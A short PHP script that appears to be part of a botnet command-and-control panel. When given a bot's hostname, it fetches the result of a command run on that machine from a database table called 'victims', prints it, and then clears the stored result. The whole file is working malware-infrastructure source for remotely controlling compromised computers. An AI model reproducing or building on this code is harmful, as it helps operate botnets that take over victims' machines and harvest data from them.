<?php
include 'session.php';
include 'conn.php';

if($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["bot"])){
  $getResult = $mysql->prepare("select cmdresult from victims where hostname=?");
  $getResult->bind_param("s", $_GET["bot"]);
  $getResult->execute();
  $getResult->store_result();
  $getResult->bind_result($cmdResult);
  $getResult->fetch();

  echo $cmdResult;

  $resetResult = $mysql->prepare("update victims set cmdresult='' where hostname=?");
  $resetResult->bind_param("s", $_GET["bot"]);
  $resetResult->execute();
}


?>
